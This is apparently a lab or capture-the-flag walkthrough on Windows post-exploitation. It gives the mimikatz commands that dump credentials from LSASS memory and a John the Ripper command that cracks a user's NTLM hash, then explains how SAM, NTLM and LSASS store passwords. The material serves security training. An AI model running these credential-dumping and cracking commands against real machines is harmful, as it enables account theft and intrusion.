## Steps

1. Open a Poweshell and navigate to the **mimikatz** folder: https://github.com/gentilkiwi/mimikatz
2. Check if you have the appropiate privileges to run the program:  
  `privilege::debug`  
  Response  
  `Privilege '20' OK`  
3. Dump the passwords from the LSASS memory using **sekurlsa** module with the **logonpasswords** function  
  `sekurlsa::logonpasswords`
4. Find emily hashes
5. Echo NTLM hash to file
6. Use JohnTheRipper to crack the hash:  
  `john --format=NT -w=/usr/share/wordlists/rockyou.txt 24-hash.txt`

## What have we learned?

- Understand post exploitation
- Understand how passwords are stored on Windows
  - Windows stores various credentials in the Security Accounts Manager (SAM) database. Commonly, credentials such as user passwords are stored as hashes within the SAM database.
  - The two most common hashes stored in the SAM database are:
    - LAN Manager (LM) - this hash is the oldest form of password storage used by Windows that are kept around for legacy systems. The algorithm used to create this hash utilizes a limited character set as input, so it's possible to try all combinations of letters and numbers to retrieve the original hash.
    - NT LAN Manager (NTLM) - Modern Windows systems use this hashing algorithm to store passwords.
  - When a user logs onto a local Windows machine, the Local Security Authority Subsystem Service (LSASS) process retrieves the user's credentials from the SAM database. It compares this against the hashed form of the user's password. If the hash of the password entered by the user matches the hash of the password stored in the SAM database, then the user can successfully log on.
  - Once this user successfully logs on, the LSASS process stores the user's credentials in memory. This is designed out of convenience; when users access other resources, they don't need to enter their credentials constantly, but the LSASS process uses the credentials stored in memory for various actions.
